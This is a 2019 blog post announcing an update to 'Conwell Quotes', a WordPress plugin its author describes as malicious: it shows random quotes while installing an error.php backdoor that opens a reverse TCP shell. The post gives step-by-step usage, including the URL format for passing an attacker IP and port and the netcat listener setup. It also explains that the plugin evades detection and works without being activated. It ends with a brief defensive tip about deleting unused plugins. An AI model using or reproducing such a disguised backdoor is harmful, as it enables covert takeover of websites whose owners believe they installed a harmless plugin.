---
author: kylepott
date: 2019-05-07 01:33:19+00:00
draft: false
title: Conwell Quotes v1.1
type: post
url: /2019/05/07/conwell-quotes-v1-1/
categories:
- Open Source
- WordPress
---

![](https://technicalagain.com/wp-content/uploads/2019/04/Screenshot-from-2019-04-14-14-34-00.png)
![](https://technicalagain.com/wp-content/uploads/2019/04/Screenshot-from-2019-04-14-14-33-29.png)


Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.

This is an update to version 1.1. This update now allows you to pass your ip and port as URL parameters rather than updating the error.php file prior to upload.

http://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XXX.X&port=XXXX

You can find the [open source code on GitHub](https://github.com/kylepott/Conwell-Quotes).

Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installations, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell's _Acres of Diamonds_ (which is one of my favorite books). It also uploads an _error.php_ backdoor that can be used to open a reverse TCP shell. The reverse shell code was mostly written by [Pen Test Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). The print lines have been either commented out, suppressed, or slightly modified to avoid detection.


### Offensive Security Use


Upload the plugin to Wordpress, use netcat to open a listener on your attack machine, and then open http://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XX.XX&port=XXXX in a browser after changing the IP and port to match your attacker machine. The screen will most likely clock, but will not display an error message that tips off the reverse shell.

![](https://technicalagain.com/wp-content/uploads/2019/04/Screenshot-from-2019-04-14-14-05-55.png)



### Note


Some hosts, like Bluehost, have their WordPress accounts on non-dedicated IPs which means they have nearly all ports blocked. You may not be able to use the malicious shell in _error.php_. However, the legitimate functionality in Conwell Quotes will still work and the user will not receive any error message.

To get access to the reverse shell, the plugin does not need to be activated, it simply needs to be installed. Yet another good reason to delete out any unused WordPress plugins.

_Do this one thing._

Make sure you delete, and don't just deactivate, unused WordPress plugins. This is a perfect example of the malicious code residing in the plugin even if it is deactivated.
